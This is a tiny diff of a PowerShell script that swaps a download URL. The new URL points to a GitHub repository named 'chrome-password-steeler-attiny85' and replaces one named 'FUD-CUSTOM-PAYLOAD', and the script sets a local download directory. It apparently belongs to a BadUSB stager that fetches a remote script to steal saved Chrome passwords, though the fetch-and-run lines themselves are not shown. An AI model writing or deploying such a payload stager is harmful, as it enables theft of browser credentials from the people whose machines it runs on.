@@ -1,5 +1,5 @@
 # Define the URL of the script
-$scriptUrl = "https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/chrome1.ps1"
+$scriptUrl = "https://raw.githubusercontent.com/BADTOMXXX/chrome-password-steeler-attiny85/main/chrome1.ps1"
 
 # Define the directory where you want to download the script
 $scriptDir = "D:\"
